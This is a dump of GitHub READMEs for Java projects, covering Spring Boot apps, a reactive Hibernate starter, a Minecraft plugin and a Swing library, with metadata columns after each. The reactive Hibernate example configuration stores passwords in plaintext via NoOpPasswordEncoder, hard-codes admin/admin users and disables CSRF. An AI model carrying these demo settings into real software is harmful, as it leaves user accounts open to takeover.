2. `domain`是业务模型层，包含了领域对象的定义。  
3. `infra`层包含用MyBatis实现的所有数据访问类。  

# 安全  

身份验证和授权管理使用Spring Security来实现，并使用JWT进行基于令牌的身份验证。此外，借助Spring Boot的各种特性来实现异常处理、测试等功能。  

# 数据库  

本项目使用MariaDB数据库来存储应用程序数据，您可以通过执行app-main/src/main/resources目录下的schema.sql来初始化数据库。  


# 如何工作    

需要安装JDK 21。  
需要安装MariaDB。  

## 数据库初始化  

在MariaDB命令窗口中执行app-main/src/main/resources/schema.sql初始化数据库。  
在app-permission.properties和app-article.properties中根据你的数据库参数修改数据库参数。  

## 编译application
在项目的根目录下执行: mvn install

## 测试application
在项目的根目录下执行: mvn test

## 执行application
在app-main的根目录下执行: mvn spring-boot:run

## 项目地址

- [realworld](https://github.com/joyheros/realworld)  

## 如何贡献

**Pull Request:**

1. Fork 代码!
2. 创建自己的分支: `git checkout -b feature/xxxx`
3. 提交你的修改: `git commit -m 'feature: add xxxxx'`
4. 推送您的分支: `git push origin feature/xxxx`
5. 提交: `pull request`

## Git 贡献提交规范

- 参考 [vue](https://github.com/vuejs/vue/blob/dev/.github/COMMIT_CONVENTION.md) 规范

  - `feat` : 新增功能
  - `fix` : 修复缺陷
  - `docs` : 文档变更
  - `style` : 代码格式
  - `refactor` : 代码重构
  - `perf` : 性能优化
  - `test` : 添加疏漏测试或已有测试改动
  - `build` : 构建流程、外部依赖变更 (如升级 npm 包、修改打包配置等)
  - `ci` : 修改 CI 配置、脚本
  - `revert` : 回滚 commit
  - `chore` : 对构建过程或辅助工具和库的更改 (不影响源文件)
  - `wip` : 正在开发中
  - `types` : 类型定义文件修改

## 感谢以下项目提供帮助

- [gothinkster](https://github.com/gothinkster/realworld)  
- [spring-boot-realworld-example-app](https://github.com/gothinkster/spring-boot-realworld-example-app)  

## 维护者

[@joyheors](https://github.com/joyheros)  

## `Star`

非常感谢留下星星的好心人，感谢您的支持 :heart:",0,0,1,mit,0.0,"['english', 'java', 'springboot', 'mybatis', 'realworld', 'crud', 'java', 'srpingboot', 'mybatis', 'realworld', 'data', 'mapper', 'mvn', 'install', 'mvn', 'test', 'mvn', 'run', 'realworld', 'pull', 'request', 'fork', 'git', 'vue', 'npm', 'ci', 'commit', 'gothinkster', 'joyheors', 'heart']","['realworld', 'mvn', 'java', 'mybatis', 'english']",3,0,0,"['realworld', 'example', 'app', 'git', 'star']",15,"['realworld', 'example', 'app', 'git', 'star']",0,83.0,5.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,4.0,1.0,2349,23.727272727272727,6.490421455938697,"['RealWorld -> https://github.com/gothinkster/realworld', 'RealWorld -> https://github.com/gothinkster/realworld', 'Data Mapper -> https://martinfowler.com/eaaCatalog/dataMapper.html', 'realworld -> https://github.com/joyheros/realworld', 'vue -> https://github.com/vuejs/vue/blob/dev/.github/COMMIT_CONVENTION.md', 'gothinkster -> https://github.com/gothinkster/realworld', 'spring-boot-realworld-example-app -> https://github.com/gothinkster/spring-boot-realworld-example-app', '@joyheors -> https://github.com/joyheros']",8
deerborg/VeterinaryManagementAPI,main,"# Veterinary Management API

## Overview
This project is a Veterinary Management API designed to manage various aspects of a veterinary practice, including appointments, doctors, customers, and animal records. The project is implemented in Java and follows a RESTful architecture.

## Project Structure
The project is organized into several packages, each serving a different purpose. Here is an overview of the key packages and their functionalities:

- **Core Configuration**
    - Security: Contains security configurations.
    - Web Config: Configurations for the web layer.
    - Model Mapper: Configurations for model mapping.

- **Exceptions**
    - Defines custom exceptions for various error scenarios such as:
        - AppointmentAlreadyExists
        - NotFoundAnimalException
        - And others.

- **Controllers**
    - Handles incoming HTTP requests and maps them to appropriate service methods. Key controllers include:
        - CustomerController
        - DoctorController
        - AppointmentController
        - And others.

- **Services**
    - Contains business logic and service methods. Key services include:
        - CustomerService
        - DoctorService
        - AppointmentService
        - And others.

- **Models**
    - Defines the data models for the application. Key models include:
        - Customer
        - Doctor
        - Appointment
        - And others.

- **Repositories**
    - Interfaces for CRUD operations on data models. Key repositories include:
        - CustomerRepository
        - DoctorRepository
        - AppointmentRepository
        - And others.

- **Configurations**
    - Contains configuration classes for various aspects of the application. Key configurations include:
        - SecurityConfig
        - WebConfigurer
        - ModelMapperConfig
        - And others.

## How to Run
1. Clone the repository.
2. Navigate to the project directory.
3. Build the project using Maven:
   ```bash
   mvn clean install
   ```
4. Run the application:
   ```bash
   mvn spring-boot:run
   ```

## Dependencies
- Spring Boot
- Spring Security
- Spring MVC
- Spring Data JPA
- Validation
- Lombok
- ModelMapper
- Hibernate
- JPA

## Endpoints
Here is a list of key endpoints provided by the API:

- **Customer**
    - `GET /customers`: Get all customers.
    - `POST /customers`: Create a new customer.
    - `GET /customers/{id}`: Get customer by ID.

- **Doctor**
    - `GET /doctors`: Get all doctors.
    - `POST /doctors`: Create a new doctor.
    - `GET /doctors/{id}`: Get doctor by ID.

- **Appointments**
    - `GET /appointments`: Get all appointments.
    - `POST /appointments`: Create a new appointment.
    - `GET /appointments/{id}`: Get appointment by ID.

- **Animals**
    - `GET /animals`: Get all animals.
    - `POST /animals`: Create a new animal record.
    - `GET /animals/{id}`: Get animal by ID.

## Error Handling
The application uses a global exception handler to manage errors and provide meaningful responses to the client.

## Interface

In this project, MVC (Model-View-Controller) architecture is used. The interface components are located under a ""resources"" folder, which contains HTML, CSS, and JavaScript files. According to the MVC architecture:

- **Model:** Data models and business logic reside here.
- **View:** User interface components are found here. These components include HTML files and associated CSS and JavaScript files.
- **Controller:** Controllers are used to handle incoming requests and manage interaction between the model and view.

To access the interface components of the project, you can follow these steps:

1. Navigate to the ""resources"" folder in the project directory.
2. Inside this folder, you will find model, view, and controller components according to the MVC structure.
3. You can start using the interface by opening the relevant HTML, CSS, and JavaScript files in a web browser.

If you have any questions or feedback regarding the interface of the project, please feel free to contact us.

**DEMO IMAGES:**

**Login**
<img src =""assets/login.png""/>

**Register**
<img src =""assets/register.png""/>

**Main**
<img src =""assets/main.png""/>

**Panel**
<img src =""assets/management_panel.png""/>

**Create**
<img src =""assets/create_model_form.png""/>

**Update-Delete**
<img src =""assets/update_delete_model_form.png""/>


## License
This project is licensed under the MIT License.
",0,0,1,mit,0.0,"['veterinary', 'management', 'api', 'overview', 'project', 'veterinary', 'management', 'api', 'designed', 'manage', 'various', 'aspect', 'veterinary', 'practice', 'including', 'appointment', 'doctor', 'customer', 'animal', 'record', 'project', 'implemented', 'java', 'follows', 'restful', 'architecture', 'project', 'structure', 'project', 'organized', 'several', 'package', 'serving', 'different', 'purpose', 'overview', 'key', 'package', 'functionality', 'core', 'configuration', 'security', 'contains', 'security', 'configuration', 'web', 'config', 'configuration', 'web', 'layer', 'model', 'mapper', 'configuration', 'model', 'mapping', 'exception', 'defines', 'custom', 'exception', 'various', 'error', 'scenario', 'appointmentalreadyexists', 'notfoundanimalexception', 'others', 'controller', 'handle', 'incoming', 'http', 'request', 'map', 'appropriate', 'service', 'method', 'key', 'controller', 'include', 'customercontroller', 'doctorcontroller', 'appointmentcontroller', 'others', 'service', 'contains', 'business', 'logic', 'service', 'method', 'key', 'service', 'include', 'customerservice', 'doctorservice', 'appointmentservice', 'others', 'model', 'defines', 'data', 'model', 'application', 'key', 'model', 'include', 'customer', 'doctor', 'appointment', 'others', 'repositories', 'interface', 'crud', 'operation', 'data', 'model', 'key', 'repository', 'include', 'customerrepository', 'doctorrepository', 'appointmentrepository', 'others', 'configuration', 'contains', 'configuration', 'class', 'various', 'aspect', 'application', 'key', 'configuration', 'include', 'securityconfig', 'webconfigurer', 'modelmapperconfig', 'others', 'run', 'clone', 'repository', 'navigate', 'project', 'directory', 'build', 'project', 'using', 'maven', 'run', 'application', 'dependency', 'spring', 'boot', 'spring', 'security', 'spring', 'mvc', 'spring', 'data', 'jpa', 'validation', 'lombok', 'modelmapper', 'hibernate', 'jpa', 'endpoint', 'list', 'key', 'endpoint', 'provided', 'api', 'customer', 'get', 'customer', 'create', 'new', 'customer', 'get', 'customer', 'id', 'doctor', 'get', 'doctor', 'create', 'new', 'doctor', 'get', 'doctor', 'id', 'appointment', 'get', 'appointment', 'create', 'new', 'appointment', 'get', 'appointment', 'id', 'animal', 'get', 'animal', 'create', 'new', 'animal', 'record', 'get', 'animal', 'id', 'error', 'handling', 'application', 'us', 'global', 'exception', 'handler', 'manage', 'error', 'provide', 'meaningful', 'response', 'client', 'interface', 'project', 'mvc', 'architecture', 'used', 'interface', 'component', 'located', 'resource', 'folder', 'contains', 'html', 'cs', 'javascript', 'file', 'according', 'mvc', 'architecture', 'model', 'data', 'model', 'business', 'logic', 'reside', 'view', 'user', 'interface', 'component', 'found', 'component', 'include', 'html', 'file', 'associated', 'cs', 'javascript', 'file', 'controller', 'controller', 'used', 'handle', 'incoming', 'request', 'manage', 'interaction', 'model', 'view', 'access', 'interface', 'component', 'project', 'follow', 'step', 'navigate', 'resource', 'folder', 'project', 'directory', 'inside', 'folder', 'find', 'model', 'view', 'controller', 'component', 'according', 'mvc', 'structure', 'start', 'using', 'interface', 'opening', 'relevant', 'html', 'cs', 'javascript', 'file', 'web', 'browser', 'question', 'feedback', 'regarding', 'interface', 'project', 'please', 'feel', 'free', 'contact', 'u', 'demo', 'image', 'login', 'register', 'main', 'panel', 'create', 'license', 'project', 'licensed', 'mit', 'license']","['project', 'model', 'get', 'key', 'configuration']",0,0,0,"['veterinary', 'management', 'api', 'overview', 'project', 'structure', 'how', 'run', 'dependency', 'endpoint', 'error', 'handle', 'interface', 'license']",9,"['veterinary', 'management', 'api', 'overview', 'project']",2,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,4412,10.74,5.802607076350093,[],0
anaconda875/reactive-hibernate-spring-boot-starter,main,"## This module's aim is to bring Reactive Hibernate support to Spring Data.
### Some features:
1. Useful Crud and Paging/Sorting methods (just like spring-data-jpa)
2. Custom query methods (findBy\*And\*OrderBy*, @Query(""FROM Abc"")), native queries are also supported
3. Support `@Transactional` (**propagation, readOnly, rollbackFor, timeout, noRollbackFor, ...**)
4. Support `@Modifying`, `@Param`
5. Support `@Lock`, `@EntityGraph`
6. Support `@NamedQuery`, `@NamedEntityGraph`
7. Support SpEL
8. Support Pagination
9. Support Auditing
10. Auto-config
11. Of course, it is truly non-blocking and compatible with Webflux

### Some remaining things:
1. Isolation level ([#875](https://github.com/hibernate/hibernate-reactive/issues/875) and [#432](https://github.com/eclipse-vertx/vertx-sql-client/issues/432)), savepoint
2. Stored procedure ([#1446](https://github.com/eclipse-vertx/vertx-sql-client/issues/1446) and [#637](https://github.com/hibernate/hibernate-reactive/issues/637))
3. Code optimization

## Getting started:
**1. Dependency and config:**
```xml
<dependency>
    <groupId>io.github.anaconda875</groupId>
    <artifactId>reactive-hibernate-spring-boot-starter</artifactId>
    <version>1.1.0</version>
</dependency>
```
Sometimes you might need to add (in case of dependencies conflict):
```xml
<dependency>
    <groupId>org.hibernate.orm</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>6.4.4.Final</version>
    <scope>compile</scope>
</dependency>
```
Add a suitable driver (for example, MySQL):
```xml
<dependency>
    <groupId>io.vertx</groupId>
    <artifactId>vertx-mysql-client</artifactId>
    <version>${your.version}</version>
</dependency>
```
Then add these (example) configs:
```properties
spring.jpa.properties.jakarta.persistence.jdbc.url=jdbc:mysql://localhost:3306/blogdb
spring.jpa.properties.jakarta.persistence.jdbc.user=mysql
spring.jpa.properties.jakarta.persistence.jdbc.password=mysql

spring.jpa.properties.hibernate.connection.pool_size=10

spring.jpa.properties.hibernate.enhancer.enableDirtyTracking=false
spring.jpa.properties.hibernate.enhancer.enableLazyInitialization=false
spring.jpa.properties.hibernate.enhancer.enableAssociationManagement=false
```
**2. Useful Crud and Paging/Sorting methods**: see [ReactiveCrudRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactiveCrudRepository.java) and [ReactivePagingAndSortingRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactivePagingAndSortingRepository.java)  
**3. Custom query methods (with `Pageable`, `@Lock`, `@EntityGraph`, `@Param`, `@Transactional`, `@Modifying`):**
```java
  @Lock(LockModeType.PESSIMISTIC_READ)
  @EntityGraph(attributePaths = {""content""})
  Flux<Post> findByContentOrderByCreatedAtDesc(String content);
```
```java
  @Query(""SELECT p FROM Post p WHERE p.content = ?1"")
  Mono<Page<Post>> findByContentCustomPage(String content, Pageable pageable);
```
```java
    @Query(
        nativeQuery = true,
        value =
            ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by "" +
                ""FROM posts WHERE id = ?1"")
    Mono<Post> nativeQ(UUID id);
```
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by ""
              + ""FROM posts WHERE content = :content"")
  Flux<Post> nativeQ2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(nativeQuery = true, value = ""DELETE from posts WHERE content = :content"")
  @Transactional
  Mono<?> deleteNative2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(""DELETE FROM Post p WHERE p.title = :title"")
  Mono<?> deleteCustom(@Param(""title"") String title);
```
**4. Support `@NamedQuery`, `@NamedEntityGraph`, Auditing:**
```java
@Data
@Entity
@NamedQueries(
    value = {
      @NamedQuery(
          name = ""Post.testNamed"",
          query = ""SELECT p FROM Post p WHERE p.content = :content"")
    })
@NamedEntityGraphs({
  @NamedEntityGraph(
      name = ""Post.testNamed"",
      attributeNodes = {@NamedAttributeNode(""title"")})
})
public class Post {

  @Id
  @GeneratedValue(generator = ""uuid"")
  @GenericGenerator(name = ""uuid"", strategy = ""uuid2"")
  UUID id;

  String title;
  String content;

  //<Auditing>
  @Column(name = ""created_at"")
  @CreatedDate
  LocalDateTime createdAt;

  @Column(name = ""last_modified_at"")
  @LastModifiedDate
  LocalDateTime lastModifiedAt;

  @Column(name = ""created_by"")
  @CreatedBy
  String createdBy;

  @Column(name = ""last_modified_by"")
  @LastModifiedBy
  String lastModifiedBy;
  //</Auditing>
}
```
```java
  //In repository
  @Lock(LockModeType.READ)
  @EntityGraph
  Mono<Page<Post>> testNamed(String content, Pageable pageable);
```
```java
//Config for Pagination, Auditing
@Configuration
@EnableReactiveJpaAuditing(auditorAwareRef = ""reactiveAuditorAware"")
public class Config {

  @Bean
  WebFluxConfigurer webFluxConfigurer() {
    return new WebFluxConfigurer() {
      @Override
      public void configureArgumentResolvers(ArgumentResolverConfigurer configurer) {
        configurer.addCustomResolver(new ReactivePageableHandlerMethodArgumentResolver());
      }
    };
  }

  @Bean
  ReactiveAuditorAware<String> reactiveAuditorAware() {
    return () ->
        ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(Authentication::getPrincipal)
            .map(UserDetails.class::cast)
            .map(UserDetails::getUsername);
  }

  @Bean
  SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http) {
    return http.csrf(ServerHttpSecurity.CsrfSpec::disable)
        .authorizeExchange(authorize -> authorize.anyExchange().authenticated())
        .httpBasic(Customizer.withDefaults())
        .build();
  }

  @Bean
  ReactiveUserDetailsService userDetailsService() {
    var isabelle = User.withUsername(""admin"").password(""admin"").authorities(""admin"").build();

    var bjorn =
        User.withUsername(""anonymous"").password(""anonymous"").authorities(""anonymous"").build();

    return new MapReactiveUserDetailsService(isabelle, bjorn);
  }

  @Bean
  PasswordEncoder passwordEncoder() {
    return NoOpPasswordEncoder.getInstance();
  }

  @Bean
  ReactiveEvaluationContextExtension securityExtension() {
    return new ReactiveEvaluationContextExtension() {

      @Override
      public String getExtensionId() {
        return ""webflux-security"";
      }

      @Override
      public Mono<? extends EvaluationContextExtension> getExtension() {
        return ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(SecurityEvaluationContextExtension::new);
      }
    };
  }
}

```
**5. SpEL:**
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by FROM posts "" +
              ""WHERE created_by = :#{authentication.name} AND title = :title "" +
              ""AND last_modified_by = :#{authentication.name}"")
  Mono<Post> testSpelNative2(@Param(""title"") String title);
```
```java
  @Query(
      ""SELECT p from #{#entityName} p WHERE p.lastModifiedBy = :#{authentication.name} AND p.title = ?1 AND p.createdBy = :#{authentication.name}"")
  @EntityGraph(attributePaths = {""createdBy""})
  Mono<Post> testSpel3(String title);
```

**6. TO BE CONTINUED...**

This is an example of how to use it (with Postgres): https://github.com/anaconda875/spring-hibernate-reactive-mutiny-example

If you guys find it useful for our business, feel free to use and report bugs to me
",0,0,12,apache-2.0,11.0,"['module', 'aim', 'bring', 'reactive', 'hibernate', 'support', 'spring', 'data', 'feature', 'useful', 'crud', 'method', 'like', 'custom', 'query', 'method', 'findby', 'orderby', 'query', 'abc', 'native', 'query', 'also', 'supported', 'support', 'propagation', 'readonly', 'rollbackfor', 'timeout', 'norollbackfor', 'support', 'support', 'support', 'support', 'spel', 'support', 'pagination', 'support', 'auditing', 'course', 'truly', 'compatible', 'webflux', 'remaining', 'thing', 'isolation', 'level', 'savepoint', 'stored', 'procedure', 'code', 'optimization', 'getting', 'started', 'dependency', 'config', 'sometimes', 'might', 'need', 'add', 'case', 'dependency', 'conflict', 'add', 'suitable', 'driver', 'example', 'mysql', 'add', 'example', 'configs', 'useful', 'crud', 'method', 'see', 'reactivecrudrepository', 'reactivepagingandsortingrepository', 'custom', 'query', 'method', 'support', 'auditing', 'spel', 'continued', 'example', 'use', 'postgres', 'http', 'guy', 'find', 'useful', 'business', 'feel', 'free', 'use', 'report', 'bug']","['support', 'method', 'query', 'useful', 'add']",4,0,0,"['this', 'module', 'aim', 'bring', 'reactive', 'hibernate', 'support', 'spring', 'data', 'some', 'feature', 'some', 'remain', 'thing', 'get', 'start']",4,"['some', 'this', 'module', 'aim', 'bring']",15,0.0,1.0,"[com.spotify.fmt:fmt-maven-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,7685,33.47826086956522,7.0532467532467535,"['#875 -> https://github.com/hibernate/hibernate-reactive/issues/875', '#432 -> https://github.com/eclipse-vertx/vertx-sql-client/issues/432', '#1446 -> https://github.com/eclipse-vertx/vertx-sql-client/issues/1446', '#637 -> https://github.com/hibernate/hibernate-reactive/issues/637']",4
agitrubard/java-spring-best-practices,main,"# ☕️  🍃 | Java & Spring Best Practices

## 🚀 Introduction
This repository is a collection of best practices and code snippets for Java development using the Spring Framework. Our goal is to help developers use Spring more effectively and write cleaner, more maintainable, and more scalable code.

## 📄 Content
In this repository, you will find:

- **Best Practices:** Guidelines and recommendations for using Spring in various scenarios.
- **Code Snippets:** Short and concise code examples demonstrating the best practices.
- **Explanations:** Clear explanations of the reasoning and best practices behind the code snippets.

## 💬 How to Use
- Browse the best practices and identify those that are relevant to your project.
- Copy the corresponding code snippets and paste them into your project.
- Adapt the code snippets to your project's specific requirements if necessary.
- Read the explanations to understand the reasoning and best practices behind the code snippets.

## 🧑‍💻 Contributing
You are encouraged to contribute to this repository! You can add new best practices, code snippets, or explanations. To contribute, please submit a pull request using https://docs.github.com/articles/about-pull-requests.

#### If you have a best practice to share or an improvement to an existing snippet, feel free to open a pull request or an issue.

1. Fork the repository
2. Create a new branch: `git checkout -b feature-branch`
4. Commit your changes: `git commit -m 'Add some feature'`
5. Push to the branch: `git push origin feature-branch`
6. Open a Pull Request to `main` branch

## 🙌🏼 Acknowledgements
Thank you to everyone who has contributed to this repository!

## **Support**

<p align=""center"">
<a href=""https://buymeacoffee.com/n8fyqpyf6md""> <img align=""center"" src=""https://bit.ly/4ekTsq0"" width=""249""></a>
",0,0,1,apache-2.0,2.0,"['java', 'spring', 'best', 'practice', 'introduction', 'repository', 'collection', 'best', 'practice', 'code', 'snippet', 'java', 'development', 'using', 'spring', 'framework', 'goal', 'help', 'developer', 'use', 'spring', 'effectively', 'write', 'cleaner', 'maintainable', 'scalable', 'code', 'content', 'repository', 'find', 'best', 'practice', 'guideline', 'recommendation', 'using', 'spring', 'various', 'scenario', 'code', 'snippet', 'short', 'concise', 'code', 'example', 'demonstrating', 'best', 'practice', 'explanation', 'clear', 'explanation', 'reasoning', 'best', 'practice', 'behind', 'code', 'snippet', 'use', 'browse', 'best', 'practice', 'identify', 'relevant', 'project', 'copy', 'corresponding', 'code', 'snippet', 'paste', 'project', 'adapt', 'code', 'snippet', 'project', 'specific', 'requirement', 'necessary', 'read', 'explanation', 'understand', 'reasoning', 'best', 'practice', 'behind', 'code', 'snippet', 'contributing', 'encouraged', 'contribute', 'repository', 'add', 'new', 'best', 'practice', 'code', 'snippet', 'explanation', 'contribute', 'please', 'submit', 'pull', 'request', 'using', 'http', 'best', 'practice', 'share', 'improvement', 'existing', 'snippet', 'feel', 'free', 'open', 'pull', 'request', 'issue', 'fork', 'repository', 'create', 'new', 'branch', 'commit', 'change', 'push', 'branch', 'open', 'pull', 'request', 'branch', 'acknowledgement', 'thank', 'everyone', 'contributed', 'repository', 'support']","['best', 'practice', 'code', 'snippet', 'repository']",1,0,0,"['java', 'spring', 'best', 'practice', 'introduction', 'content', 'how', 'use', 'contribute', 'if', 'best', 'practice', 'share', 'improvement', 'exist', 'snippet', 'feel', 'free', 'open', 'pull', 'request', 'issue', 'acknowledgement', 'support']",8,"['best', 'practice', 'java', 'spring', 'introduction']",0,11.0,4.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,4.0,0.0,1820,13.55,5.136531365313653,[],0
GeyserExtensionists/GeyserModelEngine,main,"# GeyserModelEngine 
# About

Thanks to [Willem](https://github.com/OmeWillem) for adding the following features:
- Part Visibility
- Color support
- Scaling support
- & more

# How To Install

Download the following plugins according to what server software you use.

| plugins                        | Link                                                                 | effect                          |
| :---                           | :----                                                                | :---                            |
| GeyserUtils                    | [Github](https://github.com/GeyserExtensionists/GeyserUtils)                    | Get your Geyser to support calling some BE stuff  |
| GeyserModelEngine              | [Github](https://github.com/GeyserExtensionists/GeyserModelEngine)              | Make your bedrock support MEG4                            |
| GeyserModelEnginePackGenerator | [Github](https://github.com/GeyserExtensionists/GeyserModelEnginePackGenerator) | Help you automatically transform the model to generate resource packs        |

- Put `GeyserModelEngine` in the plugins folder (only Spigot or forks of Spigot supported)
- Put either `geyserutils-spigot` in your plugins folder aswell (`geyserutils-velocity`/`geyserutils-bungeecord` in your Velocity/Bungeecord plugins folder if you use it)
- Put `GeyserModelEnginePackGenerator` and `geyserutils-geyser` into `plugins/[Geyser-Folder]/extensions`

Start the server to generate the relevant configuration files, and then shut down the server to convert any models.

# Convert Models
This is old method to convert model:

`GeyserModelEnginePackGenerator` is capable of generating models all by itself. After generating it will also apply this pack automatically.

- First go to `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator/input/`
- Create a folder in this directory with the ID of the model. (this is the same name as your model within ModelEngine 4.)

<img src=""docsimg/example.jpg"" width=""500"">

> Each model should have a separate model folder
> Subfolders are supported if you want to categorize them

- Now use BlockBench and convert your model to a Bedrock Entity, this will allow you to export the Bedrock Geometry and Animations.
- Put the geometry, animations and texture file in this folder you've made.

<img src=""docsimg/example1.jpg"" width=""500"">

- Restart the server or reload geyser to start generating the resource pack.
- Go to  `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator`, and you should see your pack generated!

<img src=""docsimg/example2.jpg"" width=""500"">

- Final step, reload Geyser or restart the server to load the resource pack.
- Congratulations, you've completed this tutorial!

# Model Packer

This is new way to convert model
- Firstly, install [packer plugin](https://github.com/GeyserExtensionists/GeyserModelEngineBlockbenchPacker) for your blockbench.
- Then, open your bbmodel, go `File -> Export -> Export GeyserModelEngine Model`, you will get a zip, just unzip it to `input` folder.

# Tips

* Pay attention! The pack only regenerates when the number of models changes, you can technically speaking remove the generated_pack folder to force a reload aswell.
* You do not have to manually put the pack into the packs folder of Geyser, the extension is capable of loading the pack itself.
* Choose a right texture when use the packer.

# Current issues

* Multi-textures and Animated textures need use [a blockbench plugin] (https://github.com/GeyserExtensionists/GeyserModelEngineBlockbenchPacker) to export

* Please report any bugs

# FAQ

### Where can I contact you?
You can contact us on our Discord: https://discord.gg/NNNaUdAbpP
",2,2,3,mit,13.0,"['geysermodelengine', 'thanks', 'willem', 'adding', 'following', 'feature', 'part', 'visibility', 'color', 'support', 'scaling', 'support', 'install', 'download', 'following', 'plugins', 'according', 'server', 'software', 'use', 'plugins', 'link', 'effect', 'geyserutils', 'github', 'get', 'geyser', 'support', 'calling', 'stuff', 'geysermodelengine', 'github', 'make', 'bedrock', 'support', 'geysermodelenginepackgenerator', 'github', 'help', 'automatically', 'transform', 'model', 'generate', 'resource', 'pack', 'put', 'plugins', 'folder', 'spigot', 'fork', 'spigot', 'supported', 'put', 'either', 'plugins', 'folder', 'aswell', 'plugins', 'folder', 'use', 'put', 'start', 'server', 'generate', 'relevant', 'configuration', 'file', 'shut', 'server', 'convert', 'model', 'convert', 'model', 'old', 'method', 'convert', 'model', 'capable', 'generating', 'model', 'generating', 'also', 'apply', 'pack', 'automatically', 'first', 'go', 'create', 'folder', 'directory', 'id', 'model', 'name', 'model', 'within', 'modelengine', 'model', 'separate', 'model', 'folder', 'subfolders', 'supported', 'want', 'categorize', 'use', 'blockbench', 'convert', 'model', 'bedrock', 'entity', 'allow', 'export', 'bedrock', 'geometry', 'animation', 'put', 'geometry', 'animation', 'texture', 'file', 'folder', 'made', 'restart', 'server', 'reload', 'geyser', 'start', 'generating', 'resource', 'pack', 'go', 'see', 'pack', 'generated', 'final', 'step', 'reload', 'geyser', 'restart', 'server', 'load', 'resource', 'pack', 'congratulation', 'completed', 'tutorial', 'model', 'packer', 'new', 'way', 'convert', 'model', 'firstly', 'install', 'packer', 'plugin', 'blockbench', 'open', 'bbmodel', 'go', 'get', 'zip', 'unzip', 'folder', 'tip', 'pay', 'attention', 'pack', 'regenerates', 'number', 'model', 'change', 'technically', 'speaking', 'remove', 'folder', 'force', 'reload', 'aswell', 'manually', 'put', 'pack', 'pack', 'folder', 'geyser', 'extension', 'capable', 'loading', 'pack', 'choose', 'right', 'texture', 'use', 'packer', 'current', 'issue', 'animated', 'texture', 'need', 'use', 'blockbench', 'plugin', 'http', 'export', 'please', 'report', 'bug', 'faq', 'contact', 'contact', 'u', 'discord', 'http']","['model', 'pack', 'folder', 'plugins', 'server']",3,0,0,"['geysermodelengine', 'about', 'how', 'to', 'install', 'convert', 'model', 'model', 'packer', 'tip', 'current', 'issue', 'faq', 'where', 'i', 'contact', 'you']",9,"['model', 'geysermodelengine', 'about', 'how', 'to']",0,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0,3732,23.25,5.716129032258064,"['Willem -> https://github.com/OmeWillem', 'Github -> https://github.com/GeyserExtensionists/GeyserUtils', 'Github -> https://github.com/GeyserExtensionists/GeyserModelEngine', 'Github -> https://github.com/GeyserExtensionists/GeyserModelEnginePackGenerator', 'packer plugin -> https://github.com/GeyserExtensionists/GeyserModelEngineBlockbenchPacker']",5
DJ-Raven/swing-modal-dialog,main,"# Swing Modal Dialog

Java swing library build with flatlaf look and feel for desktop application. This library include more custom components
and support animation

- [x] Modal dialog
- [x] Drawer
- [x] Toast Notification

![Simple 1](screenshot/simple%201.png)
![Simple 2](screenshot/simple%202.png)
![Simple 3](screenshot/simple%203.png)

## Installation

[![Maven Central](https://img.shields.io/maven-central/v/io.github.dj-raven/modal-dialog?label=Maven%20Central)](https://search.maven.org/artifact/io.github.dj-raven/modal-dialog)

Add the dependency
``` xml
<dependency>
    <groupId>io.github.dj-raven</groupId>
    <artifactId>modal-dialog</artifactId>
    <version>2.0</version>
</dependency>
```

### Snapshots
To get the latest updates before the release, you can use the snapshot version from [Sonatype OSS Snapshots](https://s01.oss.sonatype.org/content/repositories/snapshots/io/github/dj-raven/modal-dialog/)

``` xml
<repositories>
    <repository>
        <id>sonatype-oss-snapshots</id>
        <url>https://s01.oss.sonatype.org/content/repositories/snapshots/</url>
    </repository>
</repositories>
```
Add the snapshot version
``` xml
<dependency>
    <groupId>io.github.dj-raven</groupId>
    <artifactId>modal-dialog</artifactId>
    <version>2.1.0-SNAPSHOT</version>
</dependency>
```

## Demo
Get jar file here: [latest-releases](https://github.com/DJ-Raven/swing-modal-dialog/releases/latest)

## Document

Not yet

## Library Resources

- [FlatLaf](https://github.com/JFormDesigner/FlatLaf) - FlatLaf library for the modern UI design theme
- [MigLayout](https://github.com/mikaelgrev/miglayout) - MigLayout library for flexible layout management
